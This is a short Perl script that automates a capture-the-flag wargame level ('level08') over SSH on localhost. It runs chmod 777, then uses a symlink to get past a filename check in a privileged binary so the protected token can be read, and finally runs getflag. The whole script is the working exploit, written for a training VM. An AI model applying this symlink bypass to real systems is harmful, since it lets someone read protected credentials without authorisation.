#!/usr/bin/perl

$port = "22222";
$ip = "localhost";
$red = "\e[31m";
$green = "\e[32m";
$reset = "\e[0m";
$user = "level08";

$exploit = "ssh -qp $port $user\@$ip 'chmod 777 . && ln -s token flag && ./level08 flag'";
print $red, $exploit, $reset, "\n";
system($exploit);

$flag = "ssh -qp $port flag08\@$ip 'getflag'";
print $green, $flag, $reset, "\n";
system($flag);
